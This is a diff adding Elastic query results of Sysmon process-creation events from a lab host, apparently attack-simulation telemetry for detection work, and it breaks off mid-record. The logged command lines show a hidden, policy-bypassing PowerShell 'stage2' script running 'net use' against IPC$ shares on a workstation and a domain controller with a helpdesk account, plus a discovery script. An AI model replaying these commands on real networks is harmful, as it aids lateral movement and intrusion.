+            "FileVersion": "10.0.19041.3636 (WinBuild.160101.0800)",
+            "LogonId": "0x3e7"
+          },
+          "opcode": "Info",
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "user": {
+            "identifier": "S-1-5-18",
+            "domain": "NT AUTHORITY",
+            "name": "SYSTEM",
+            "type": "User"
+          },
+          "version": 5
+        },
+        "log": {
+          "level": "information"
+        },
+        "elastic_agent": {
+          "id": "a6d6f3d2-78d0-4e95-a44c-0e5fc12b1a88",
+          "version": "9.5.3",
+          "snapshot": false
+        },
+        "message": "Process Create:\nRuleName: -\nUtcTime: 2026-10-27 12:26:14.944\nProcessGuid: {88E52A21-9866-6AE0-B104-000000002600}\nProcessId: 7608\nImage: C:\\Windows\\System32\\cmd.exe\nFileVersion: 10.0.19041.3636 (WinBuild.160101.0800)\nDescription: Windows Command Processor\nProduct: Microsoft\u00ae Windows\u00ae Operating System\nCompany: Microsoft Corporation\nOriginalFileName: Cmd.Exe\nCommandLine: \"C:\\Windows\\system32\\cmd.exe\" /c \"net use \\\\WS01\\IPC$ /user:C0015\\helpdesk ***\"\nCurrentDirectory: C:\\Windows\\system32\\\nUser: NT AUTHORITY\\SYSTEM\nLogonGuid: {88E52A21-7C25-6AE0-E703-000000000000}\nLogonId: 0x3e7\nTerminalSessionId: 0\nIntegrityLevel: System\nHashes: SHA256=265B69033CEA7A9F8214A34CD9B17912909AF46C7A47395DD7BB893A24507E59,IMPHASH=272245E2988E1E430500B852C4FB5E18\nParentProcessGuid: {88E52A21-9771-6AE0-9F04-000000002600}\nParentProcessId: 5912\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nParentCommandLine: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\Windows\\Temp\\c0015_stage2.ps1\nParentUser: NT AUTHORITY\\SYSTEM",
+        "input": {
+          "type": "winlog"
+        },
+        "@timestamp": "2026-10-27T12:26:14.944Z",
+        "ecs": {
+          "version": "8.17.0"
+        },
+        "related": {
+          "user": [
+            "SYSTEM"
+          ],
+          "hash": [
+            "265b69033cea7a9f8214a34cd9b17912909af46c7a47395dd7bb893a24507e59",
+            "272245e2988e1e430500b852c4fb5e18"
+          ]
+        },
+        "data_stream": {
+          "namespace": "c0015",
+          "type": "logs",
+          "dataset": "windows.sysmon_operational"
+        },
+        "host": {
+          "hostname": "WS01",
+          "os": {
+            "build": "19045.3803",
+            "kernel": "10.0.19041.3803 (WinBuild.160101.0800)",
+            "name": "Windows 10 Pro",
+            "family": "windows",
+            "type": "windows",
+            "version": "10.0",
+            "platform": "windows"
+          },
+          "ip": [
+            "fe80::a7db:e701:40fd:fff7",
+            "192.168.50.20",
+            "fe80::1ec6:790e:c5d8:664f",
+            "192.168.106.136"
+          ],
+          "name": "ws01",
+          "id": "88e52a21-1605-4868-9e88-53ea14415caa",
+          "mac": [
+            "00-0C-29-BF-09-D2",
+            "00-0C-29-BF-09-DC"
+          ],
+          "architecture": "x86_64"
+        },
+        "event": {
+          "agent_id_status": "verified",
+          "ingested": "2026-10-27T12:26:18Z",
+          "code": "1",
+          "provider": "Microsoft-Windows-Sysmon",
+          "kind": "event",
+          "created": "2026-10-27T12:26:16.545Z",
+          "action": "Process creation",
+          "category": [
+            "process"
+          ],
+          "type": [
+            "start"
+          ],
+          "dataset": "windows.sysmon_operational"
+        },
+        "user": {
+          "domain": "NT AUTHORITY",
+          "name": "SYSTEM",
+          "id": "S-1-5-18"
+        }
+      },
+      "query_index": 0
+    },
+    {
+      "_index": ".ds-logs-windows.sysmon_operational-c0015-2026.10.24-000002",
+      "_id": "AaF9U4505TXapMGDqOq8",
+      "_source": {
+        "agent": {
+          "name": "WS01",
+          "id": "a6d6f3d2-78d0-4e95-a44c-0e5fc12b1a88",
+          "ephemeral_id": "ae039b37-ba6f-464f-8073-73b0d9659b1a",
+          "type": "filebeat",
+          "version": "9.5.3"
+        },
+        "process": {
+          "args": [
+            "C:\\Windows\\system32\\cmd.exe",
+            "/c",
+            "net use \\\\WS01\\IPC$ /delete /y"
+          ],
+          "parent": {
+            "args": [
+              "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "-NoProfile",
+              "-ExecutionPolicy",
+              "Bypass",
+              "-WindowStyle",
+              "Hidden",
+              "-File",
+              "C:\\Windows\\Temp\\c0015_stage2.ps1"
+            ],
+            "name": "powershell.exe",
+            "pid": 5912,
+            "args_count": 8,
+            "entity_id": "{88E52A21-9771-6AE0-9F04-000000002600}",
+            "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "command_line": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\Windows\\Temp\\c0015_stage2.ps1"
+          },
+          "pe": {
+            "file_version": "10.0.19041.3636 (WinBuild.160101.0800)",
+            "product": "Microsoft\u00ae Windows\u00ae Operating System",
+            "imphash": "272245e2988e1e430500b852c4fb5e18",
+            "description": "Windows Command Processor",
+            "original_file_name": "Cmd.Exe",
+            "company": "Microsoft Corporation"
+          },
+          "name": "cmd.exe",
+          "pid": 6272,
+          "working_directory": "C:\\Windows\\system32\\",
+          "args_count": 3,
+          "entity_id": "{88E52A21-986F-6AE0-B304-000000002600}",
+          "hash": {
+            "sha256": "265b69033cea7a9f8214a34cd9b17912909af46c7a47395dd7bb893a24507e59"
+          },
+          "executable": "C:\\Windows\\System32\\cmd.exe",
+          "command_line": "\"C:\\Windows\\system32\\cmd.exe\" /c \"net use \\\\WS01\\IPC$ /delete /y\""
+        },
+        "winlog": {
+          "record_id": "1228352",
+          "computer_name": "WS01.c0015.lab",
+          "process": {
+            "pid": 2616,
+            "thread": {
+              "id": 3880
+            }
+          },
+          "event_id": "1",
+          "task": "Process Create (rule: ProcessCreate)",
+          "provider_guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}",
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_data": {
+            "Company": "Microsoft Corporation",
+            "LogonGuid": "{88E52A21-7C25-6AE0-E703-000000000000}",
+            "Description": "Windows Command Processor",
+            "TerminalSessionId": "0",
+            "IntegrityLevel": "System",
+            "ParentUser": "NT AUTHORITY\\SYSTEM",
+            "Product": "Microsoft\u00ae Windows\u00ae Operating System",
+            "FileVersion": "10.0.19041.3636 (WinBuild.160101.0800)",
+            "LogonId": "0x3e7"
+          },
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "opcode": "Info",
+          "version": 5,
+          "user": {
+            "identifier": "S-1-5-18",
+            "domain": "NT AUTHORITY",
+            "name": "SYSTEM",
+            "type": "User"
+          }
+        },
+        "log": {
+          "level": "information"
+        },
+        "elastic_agent": {
+          "id": "a6d6f3d2-78d0-4e95-a44c-0e5fc12b1a88",
+          "version": "9.5.3",
+          "snapshot": false
+        },
+        "message": "Process Create:\nRuleName: -\nUtcTime: 2026-10-27 12:26:23.169\nProcessGuid: {88E52A21-986F-6AE0-B304-000000002600}\nProcessId: 6272\nImage: C:\\Windows\\System32\\cmd.exe\nFileVersion: 10.0.19041.3636 (WinBuild.160101.0800)\nDescription: Windows Command Processor\nProduct: Microsoft\u00ae Windows\u00ae Operating System\nCompany: Microsoft Corporation\nOriginalFileName: Cmd.Exe\nCommandLine: \"C:\\Windows\\system32\\cmd.exe\" /c \"net use \\\\WS01\\IPC$ /delete /y\"\nCurrentDirectory: C:\\Windows\\system32\\\nUser: NT AUTHORITY\\SYSTEM\nLogonGuid: {88E52A21-7C25-6AE0-E703-000000000000}\nLogonId: 0x3e7\nTerminalSessionId: 0\nIntegrityLevel: System\nHashes: SHA256=265B69033CEA7A9F8214A34CD9B17912909AF46C7A47395DD7BB893A24507E59,IMPHASH=272245E2988E1E430500B852C4FB5E18\nParentProcessGuid: {88E52A21-9771-6AE0-9F04-000000002600}\nParentProcessId: 5912\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nParentCommandLine: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\Windows\\Temp\\c0015_stage2.ps1\nParentUser: NT AUTHORITY\\SYSTEM",
+        "input": {
+          "type": "winlog"
+        },
+        "@timestamp": "2026-10-27T12:26:23.169Z",
+        "ecs": {
+          "version": "8.17.0"
+        },
+        "related": {
+          "user": [
+            "SYSTEM"
+          ],
+          "hash": [
+            "265b69033cea7a9f8214a34cd9b17912909af46c7a47395dd7bb893a24507e59",
+            "272245e2988e1e430500b852c4fb5e18"
+          ]
+        },
+        "data_stream": {
+          "namespace": "c0015",
+          "type": "logs",
+          "dataset": "windows.sysmon_operational"
+        },
+        "host": {
+          "hostname": "WS01",
+          "os": {
+            "build": "19045.3803",
+            "kernel": "10.0.19041.3803 (WinBuild.160101.0800)",
+            "name": "Windows 10 Pro",
+            "type": "windows",
+            "family": "windows",
+            "version": "10.0",
+            "platform": "windows"
+          },
+          "ip": [
+            "fe80::a7db:e701:40fd:fff7",
+            "192.168.50.20",
+            "fe80::1ec6:790e:c5d8:664f",
+            "192.168.106.136"
+          ],
+          "name": "ws01",
+          "id": "88e52a21-1605-4868-9e88-53ea14415caa",
+          "mac": [
+            "00-0C-29-BF-09-D2",
+            "00-0C-29-BF-09-DC"
+          ],
+          "architecture": "x86_64"
+        },
+        "event": {
+          "agent_id_status": "verified",
+          "ingested": "2026-10-27T12:26:27Z",
+          "code": "1",
+          "provider": "Microsoft-Windows-Sysmon",
+          "created": "2026-10-27T12:26:24.567Z",
+          "kind": "event",
+          "action": "Process creation",
+          "category": [
+            "process"
+          ],
+          "type": [
+            "start"
+          ],
+          "dataset": "windows.sysmon_operational"
+        },
+        "user": {
+          "domain": "NT AUTHORITY",
+          "name": "SYSTEM",
+          "id": "S-1-5-18"
+        }
+      },
+      "query_index": 0
+    },
+    {
+      "_index": ".ds-logs-windows.sysmon_operational-c0015-2026.10.24-000002",
+      "_id": "AaF9U4505TXapMGDqOrI",
+      "_source": {
+        "agent": {
+          "name": "WS01",
+          "id": "a6d6f3d2-78d0-4e95-a44c-0e5fc12b1a88",
+          "ephemeral_id": "ae039b37-ba6f-464f-8073-73b0d9659b1a",
+          "type": "filebeat",
+          "version": "9.5.3"
+        },
+        "process": {
+          "args": [
+            "C:\\Windows\\system32\\cmd.exe",
+            "/c",
+            "net use \\\\WS01\\IPC$ /user:C0015\\helpdesk ***"
+          ],
+          "parent": {
+            "args": [
+              "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "-NoProfile",
+              "-ExecutionPolicy",
+              "Bypass",
+              "-WindowStyle",
+              "Hidden",
+              "-File",
+              "C:\\Windows\\Temp\\c0015_stage2.ps1"
+            ],
+            "name": "powershell.exe",
+            "pid": 5912,
+            "args_count": 8,
+            "entity_id": "{88E52A21-9771-6AE0-9F04-000000002600}",
+            "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "command_line": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\Windows\\Temp\\c0015_stage2.ps1"
+          },
+          "pe": {
+            "file_version": "10.0.19041.3636 (WinBuild.160101.0800)",
+            "product": "Microsoft\u00ae Windows\u00ae Operating System",
+            "imphash": "272245e2988e1e430500b852c4fb5e18",
+            "description": "Windows Command Processor",
+            "original_file_name": "Cmd.Exe",
+            "company": "Microsoft Corporation"
+          },
+          "name": "cmd.exe",
+          "pid": 5268,
+          "working_directory": "C:\\Windows\\system32\\",
+          "args_count": 3,
+          "entity_id": "{88E52A21-986F-6AE0-B504-000000002600}",
+          "hash": {
+            "sha256": "265b69033cea7a9f8214a34cd9b17912909af46c7a47395dd7bb893a24507e59"
+          },
+          "executable": "C:\\Windows\\System32\\cmd.exe",
+          "command_line": "\"C:\\Windows\\system32\\cmd.exe\" /c \"net use \\\\WS01\\IPC$ /user:C0015\\helpdesk ***\""
+        },
+        "winlog": {
+          "computer_name": "WS01.c0015.lab",
+          "record_id": "1228364",
+          "process": {
+            "pid": 2616,
+            "thread": {
+              "id": 3880
+            }
+          },
+          "event_id": "1",
+          "task": "Process Create (rule: ProcessCreate)",
+          "provider_guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}",
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_data": {
+            "Company": "Microsoft Corporation",
+            "LogonGuid": "{88E52A21-7C25-6AE0-E703-000000000000}",
+            "Description": "Windows Command Processor",
+            "IntegrityLevel": "System",
+            "TerminalSessionId": "0",
+            "Product": "Microsoft\u00ae Windows\u00ae Operating System",
+            "ParentUser": "NT AUTHORITY\\SYSTEM",
+            "FileVersion": "10.0.19041.3636 (WinBuild.160101.0800)",
+            "LogonId": "0x3e7"
+          },
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "opcode": "Info",
+          "user": {
+            "identifier": "S-1-5-18",
+            "domain": "NT AUTHORITY",
+            "name": "SYSTEM",
+            "type": "User"
+          },
+          "version": 5
+        },
+        "log": {
+          "level": "information"
+        },
+        "elastic_agent": {
+          "id": "a6d6f3d2-78d0-4e95-a44c-0e5fc12b1a88",
+          "version": "9.5.3",
+          "snapshot": false
+        },
+        "message": "Process Create:\nRuleName: -\nUtcTime: 2026-10-27 12:26:23.191\nProcessGuid: {88E52A21-986F-6AE0-B504-000000002600}\nProcessId: 5268\nImage: C:\\Windows\\System32\\cmd.exe\nFileVersion: 10.0.19041.3636 (WinBuild.160101.0800)\nDescription: Windows Command Processor\nProduct: Microsoft\u00ae Windows\u00ae Operating System\nCompany: Microsoft Corporation\nOriginalFileName: Cmd.Exe\nCommandLine: \"C:\\Windows\\system32\\cmd.exe\" /c \"net use \\\\WS01\\IPC$ /user:C0015\\helpdesk ***\"\nCurrentDirectory: C:\\Windows\\system32\\\nUser: NT AUTHORITY\\SYSTEM\nLogonGuid: {88E52A21-7C25-6AE0-E703-000000000000}\nLogonId: 0x3e7\nTerminalSessionId: 0\nIntegrityLevel: System\nHashes: SHA256=265B69033CEA7A9F8214A34CD9B17912909AF46C7A47395DD7BB893A24507E59,IMPHASH=272245E2988E1E430500B852C4FB5E18\nParentProcessGuid: {88E52A21-9771-6AE0-9F04-000000002600}\nParentProcessId: 5912\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nParentCommandLine: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\Windows\\Temp\\c0015_stage2.ps1\nParentUser: NT AUTHORITY\\SYSTEM",
+        "input": {
+          "type": "winlog"
+        },
+        "@timestamp": "2026-10-27T12:26:23.191Z",
+        "ecs": {
+          "version": "8.17.0"
+        },
+        "related": {
+          "user": [
+            "SYSTEM"
+          ],
+          "hash": [
+            "265b69033cea7a9f8214a34cd9b17912909af46c7a47395dd7bb893a24507e59",
+            "272245e2988e1e430500b852c4fb5e18"
+          ]
+        },
+        "data_stream": {
+          "namespace": "c0015",
+          "type": "logs",
+          "dataset": "windows.sysmon_operational"
+        },
+        "host": {
+          "hostname": "WS01",
+          "os": {
+            "build": "19045.3803",
+            "kernel": "10.0.19041.3803 (WinBuild.160101.0800)",
+            "name": "Windows 10 Pro",
+            "type": "windows",
+            "family": "windows",
+            "version": "10.0",
+            "platform": "windows"
+          },
+          "ip": [
+            "fe80::a7db:e701:40fd:fff7",
+            "192.168.50.20",
+            "fe80::1ec6:790e:c5d8:664f",
+            "192.168.106.136"
+          ],
+          "name": "ws01",
+          "id": "88e52a21-1605-4868-9e88-53ea14415caa",
+          "mac": [
+            "00-0C-29-BF-09-D2",
+            "00-0C-29-BF-09-DC"
+          ],
+          "architecture": "x86_64"
+        },
+        "event": {
+          "agent_id_status": "verified",
+          "ingested": "2026-10-27T12:26:27Z",
+          "code": "1",
+          "provider": "Microsoft-Windows-Sysmon",
+          "created": "2026-10-27T12:26:24.567Z",
+          "kind": "event",
+          "action": "Process creation",
+          "category": [
+            "process"
+          ],
+          "type": [
+            "start"
+          ],
+          "dataset": "windows.sysmon_operational"
+        },
+        "user": {
+          "domain": "NT AUTHORITY",
+          "name": "SYSTEM",
+          "id": "S-1-5-18"
+        }
+      },
+      "query_index": 0
+    },
+    {
+      "_index": ".ds-logs-windows.sysmon_operational-c0015-2026.10.24-000002",
+      "_id": "AaF9U4505TXapMGDqOrU",
+      "_source": {
+        "agent": {
+          "name": "WS01",
+          "id": "a6d6f3d2-78d0-4e95-a44c-0e5fc12b1a88",
+          "ephemeral_id": "ae039b37-ba6f-464f-8073-73b0d9659b1a",
+          "type": "filebeat",
+          "version": "9.5.3"
+        },
+        "process": {
+          "args": [
+            "C:\\Windows\\system32\\cmd.exe",
+            "/c",
+            "net use \\\\DC01\\IPC$ /user:C0015\\helpdesk ***"
+          ],
+          "parent": {
+            "args": [
+              "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "-NoProfile",
+              "-ExecutionPolicy",
+              "Bypass",
+              "-WindowStyle",
+              "Hidden",
+              "-File",
+              "C:\\Windows\\Temp\\c0015_stage2.ps1"
+            ],
+            "name": "powershell.exe",
+            "pid": 5912,
+            "args_count": 8,
+            "entity_id": "{88E52A21-9771-6AE0-9F04-000000002600}",
+            "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "command_line": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\Windows\\Temp\\c0015_stage2.ps1"
+          },
+          "pe": {
+            "file_version": "10.0.19041.3636 (WinBuild.160101.0800)",
+            "product": "Microsoft\u00ae Windows\u00ae Operating System",
+            "imphash": "272245e2988e1e430500b852c4fb5e18",
+            "description": "Windows Command Processor",
+            "original_file_name": "Cmd.Exe",
+            "company": "Microsoft Corporation"
+          },
+          "name": "cmd.exe",
+          "pid": 6456,
+          "working_directory": "C:\\Windows\\system32\\",
+          "args_count": 3,
+          "entity_id": "{88E52A21-986F-6AE0-B704-000000002600}",
+          "hash": {
+            "sha256": "265b69033cea7a9f8214a34cd9b17912909af46c7a47395dd7bb893a24507e59"
+          },
+          "executable": "C:\\Windows\\System32\\cmd.exe",
+          "command_line": "\"C:\\Windows\\system32\\cmd.exe\" /c \"net use \\\\DC01\\IPC$ /user:C0015\\helpdesk ***\""
+        },
+        "winlog": {
+          "computer_name": "WS01.c0015.lab",
+          "record_id": "1228376",
+          "process": {
+            "pid": 2616,
+            "thread": {
+              "id": 3880
+            }
+          },
+          "task": "Process Create (rule: ProcessCreate)",
+          "event_id": "1",
+          "provider_guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}",
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_data": {
+            "Company": "Microsoft Corporation",
+            "Description": "Windows Command Processor",
+            "LogonGuid": "{88E52A21-7C25-6AE0-E703-000000000000}",
+            "IntegrityLevel": "System",
+            "TerminalSessionId": "0",
+            "Product": "Microsoft\u00ae Windows\u00ae Operating System",
+            "ParentUser": "NT AUTHORITY\\SYSTEM",
+            "FileVersion": "10.0.19041.3636 (WinBuild.160101.0800)",
+            "LogonId": "0x3e7"
+          },
+          "opcode": "Info",
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "version": 5,
+          "user": {
+            "identifier": "S-1-5-18",
+            "domain": "NT AUTHORITY",
+            "name": "SYSTEM",
+            "type": "User"
+          }
+        },
+        "log": {
+          "level": "information"
+        },
+        "elastic_agent": {
+          "id": "a6d6f3d2-78d0-4e95-a44c-0e5fc12b1a88",
+          "version": "9.5.3",
+          "snapshot": false
+        },
+        "message": "Process Create:\nRuleName: -\nUtcTime: 2026-10-27 12:26:23.223\nProcessGuid: {88E52A21-986F-6AE0-B704-000000002600}\nProcessId: 6456\nImage: C:\\Windows\\System32\\cmd.exe\nFileVersion: 10.0.19041.3636 (WinBuild.160101.0800)\nDescription: Windows Command Processor\nProduct: Microsoft\u00ae Windows\u00ae Operating System\nCompany: Microsoft Corporation\nOriginalFileName: Cmd.Exe\nCommandLine: \"C:\\Windows\\system32\\cmd.exe\" /c \"net use \\\\DC01\\IPC$ /user:C0015\\helpdesk ***\"\nCurrentDirectory: C:\\Windows\\system32\\\nUser: NT AUTHORITY\\SYSTEM\nLogonGuid: {88E52A21-7C25-6AE0-E703-000000000000}\nLogonId: 0x3e7\nTerminalSessionId: 0\nIntegrityLevel: System\nHashes: SHA256=265B69033CEA7A9F8214A34CD9B17912909AF46C7A47395DD7BB893A24507E59,IMPHASH=272245E2988E1E430500B852C4FB5E18\nParentProcessGuid: {88E52A21-9771-6AE0-9F04-000000002600}\nParentProcessId: 5912\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nParentCommandLine: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\Windows\\Temp\\c0015_stage2.ps1\nParentUser: NT AUTHORITY\\SYSTEM",
+        "input": {
+          "type": "winlog"
+        },
+        "@timestamp": "2026-10-27T12:26:23.223Z",
+        "ecs": {
+          "version": "8.17.0"
+        },
+        "related": {
+          "user": [
+            "SYSTEM"
+          ],
+          "hash": [
+            "265b69033cea7a9f8214a34cd9b17912909af46c7a47395dd7bb893a24507e59",
+            "272245e2988e1e430500b852c4fb5e18"
+          ]
+        },
+        "data_stream": {
+          "namespace": "c0015",
+          "type": "logs",
+          "dataset": "windows.sysmon_operational"
+        },
+        "host": {
+          "hostname": "WS01",
+          "os": {
+            "build": "19045.3803",
+            "kernel": "10.0.19041.3803 (WinBuild.160101.0800)",
+            "name": "Windows 10 Pro",
+            "type": "windows",
+            "family": "windows",
+            "version": "10.0",
+            "platform": "windows"
+          },
+          "ip": [
+            "fe80::a7db:e701:40fd:fff7",
+            "192.168.50.20",
+            "fe80::1ec6:790e:c5d8:664f",
+            "192.168.106.136"
+          ],
+          "name": "ws01",
+          "id": "88e52a21-1605-4868-9e88-53ea14415caa",
+          "mac": [
+            "00-0C-29-BF-09-D2",
+            "00-0C-29-BF-09-DC"
+          ],
+          "architecture": "x86_64"
+        },
+        "event": {
+          "agent_id_status": "verified",
+          "ingested": "2026-10-27T12:26:27Z",
+          "code": "1",
+          "provider": "Microsoft-Windows-Sysmon",
+          "created": "2026-10-27T12:26:24.568Z",
+          "kind": "event",
+          "action": "Process creation",
+          "category": [
+            "process"
+          ],
+          "type": [
+            "start"
+          ],
+          "dataset": "windows.sysmon_operational"
+        },
+        "user": {
+          "domain": "NT AUTHORITY",
+          "name": "SYSTEM",
+          "id": "S-1-5-18"
+        }
+      },
+      "query_index": 0
+    },
+    {
+      "_index": ".ds-logs-windows.sysmon_operational-c0015-2026.10.24-000002",
+      "_id": "AaF9U4505TXapMGDqOrd",
+      "_source": {
+        "agent": {
+          "name": "WS01",
+          "id": "a6d6f3d2-78d0-4e95-a44c-0e5fc12b1a88",
+          "ephemeral_id": "ae039b37-ba6f-464f-8073-73b0d9659b1a",
+          "type": "filebeat",
+          "version": "9.5.3"
+        },
+        "process": {
+          "args": [
+            "C:\\Windows\\system32\\cmd.exe",
+            "/c",
+            "C:\\ProgramData\\C0015\\disc.cmd"
+          ],
+          "parent": {
+            "args": [
+              "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "-NoProfile",
+              "-ExecutionPolicy",
+              "Bypass",
+              "-WindowStyle",
+              "Hidden",
+              "-File",
+              "C:\\Windows\\Temp\\c0015_stage2.ps1"
+            ],
+            "name": "powershell.exe",
+            "pid": 5912,
+            "args_count": 8,
+            "entity_id": "{88E52A21-9771-6AE0-9F04-000000002600}",
+            "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "command_line": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\Windows\\Temp\\c0015_stage2.ps1"
+          },
+          "pe": {
+            "file_version": "10.0.19041.3636 (WinBuild.160101.0800)",
+            "product": "Microsoft\u00ae Windows\u00ae Operating System",
+            "imphash": "272245e2988e1e430500b852c4fb5e18",
+            "description": "Windows Command Processor",
+            "original_file_name": "Cmd.Exe",
+            "company": "Microsoft Corporation"
+          },
+          "name": "cmd.exe",
+          "pid": 7996,
+          "working_directory": "C:\\Windows\\system32\\",
+          "args_count": 3,
+          "entity_id": "{88E52A21-986F-6AE0-B904-000000002600}",
+          "hash": {
+            "sha256": "265b69033cea7a9f8214a34cd9b17912909af46c7a47395dd7bb893a24507e59"
+          },
+          "executable": "C:\\Windows\\System32\\cmd.exe",
+          "command_line": "\"C:\\Windows\\system32\\cmd.exe\" /c C:\\ProgramData\\C0015\\disc.cmd"
+        },
+        "winlog": {
+          "record_id": "1228385",
+          "computer_name": "WS01.c0015.lab",
+          "process": {
+            "pid": 2616,
+            "thread": {
+              "id": 3880
+            }
+          },
+          "event_id": "1",
+          "task": "Process Create (rule: ProcessCreate)",
+          "provider_guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}",
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_data": {
+            "Company": "Microsoft Corporation",
+            "LogonGuid": "{88E52A21-7C25-6AE0-E703-000000000000}",
+            "Description": "Windows Command Processor",
+            "TerminalSessionId": "0",
+            "IntegrityLevel": "System",
+            "ParentUser": "NT AUTHORITY\\SYSTEM",
+            "Product": "Microsoft\u00ae Windows\u00ae Operating System",
+            "FileVersion": "10.0.19041.3636 (WinBuild.160101.0800)",
+            "LogonId": "0x3e7"
+          },
+          "opcode": "Info",
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "user": {
+            "identifier": "S-1-5-18",
+            "domain": "NT AUTHORITY",
+            "name": "SYSTEM",
+            "type": "User"
+          },
+          "version": 5
+        },
+        "log": {
+          "level": "information"
+        },
+        "elastic_agent": {
+          "id": "a6d6f3d2-78d0-4e95-a44c-0e5fc12b1a88",
+          "version": "9.5.3",
+          "snapshot": false
+        },
+        "message": "Process Create:\nRuleName: -\nUtcTime: 2026-10-27 12:26:23.264\nProcessGuid: {88E52A21-986F-6AE0-B904-000000002600}\nProcessId: 7996\nImage: C:\\Windows\\System32\\cmd.exe\nFileVersion: 10.0.19041.3636 (WinBuild.160101.0800)\nDescription: Windows Command Processor\nProduct: Microsoft\u00ae Windows\u00ae Operating System\nCompany: Microsoft Corporation\nOriginalFileName: Cmd.Exe\nCommandLine: \"C:\\Windows\\system32\\cmd.exe\" /c C:\\ProgramData\\C0015\\disc.cmd\nCurrentDirectory: C:\\Windows\\system32\\\nUser: NT AUTHORITY\\SYSTEM\nLogonGuid: {88E52A21-7C25-6AE0-E703-000000000000}\nLogonId: 0x3e7\nTerminalSessionId: 0\nIntegrityLevel: System\nHashes: SHA256=265B69033CEA7A9F8214A34CD9B17912909AF46C7A47395DD7BB893A24507E59,IMPHASH=272245E2988E1E430500B852C4FB5E18\nParentProcessGuid: {88E52A21-9771-6AE0-9F04-000000002600}\nParentProcessId: 5912\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nParentCommandLine: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\Windows\\Temp\\c0015_stage2.ps1\nParentUser: NT AUTHORITY\\SYSTEM",
+        "input": {
+          "type": "winlog"
+        },
+        "@timestamp": "2026-10-27T12:26:23.264Z",
+        "ecs": {
+          "version": "8.17.0"
+        },
+        "related": {
+          "user": [
+            "SYSTEM"
+          ],
+          "hash": [
+            "265b69033cea7a9f8214a34cd9b17912909af46c7a47395dd7bb893a24507e59",
+            "272245e2988e1e430500b852c4fb5e18"
+          ]
+        },
+        "data_stream": {
+          "namespace": "c0015",
+          "type": "logs",
+          "dataset": "windows.sysmon_operational"
+        },
+        "host": {
+          "hostname": "WS01",
+          "os": {
+            "build": "19045.3803",
+            "kernel": "10.0.19041.3803 (WinBuild.160101.0800)",
+            "name": "Windows 10 Pro",
+            "family": "windows",
+            "type": "windows",
+            "version": "10.0",
+            "platform": "windows"
+          },
+          "ip": [
+            "fe80::a7db:e701:40fd:fff7",
+            "192.168.50.20",
+            "fe80::1ec6:790e:c5d8:664f",
+            "192.168.106.136"
+          ],
+          "name": "ws01",
+          "id": "88e52a21-1605-4868-9e88-53ea14415caa",
+          "mac": [
+            "00-0C-29-BF-09-D2",
+            "00-0C-29-BF-09-DC"
+          ],
+          "architecture": "x86_64"
+        },
+        "event": {
+          "agent_id_status": "verified",
+          "ingested": "2026-10-27T12:26:27Z",
+          "code": "1",
+          "provider": "Microsoft-Windows-Sysmon",
+          "created": "2026-10-27T12:26:24.568Z",
+          "kind": "event",
+          "action": "Process creation",
+          "category": [
+            "process"
+          ],
+          "type": [
+            "start"
+          ],
+          "dataset": "windows.sysmon_operational"
+        },
+        "user": {
+          "domain": "NT AUTHORITY",
+          "name": "SYSTEM",
+          "id": "S-1-5-18"
+        }
+      },
+      "query_index": 0
+    },
+    {
+      "_index": ".ds-logs-windows.sysmon_operational-c0015-2026.10.24-000002",
+      "_id": "AaF9VI505TXapMElq25e",
+      "_source": {
+        "agent": {
+          "name": "WS01",
+          "id": "a6d6f3d2-78d0-4e95-a44c-0e5fc12b1a88",
+          "ephemeral_id": "ae039b37-ba6f-464f-8073-73b0d9659b1a",
+          "type": "filebeat",
+          "version": "9.5.3"
+        },
+        "process": {
+          "args": [
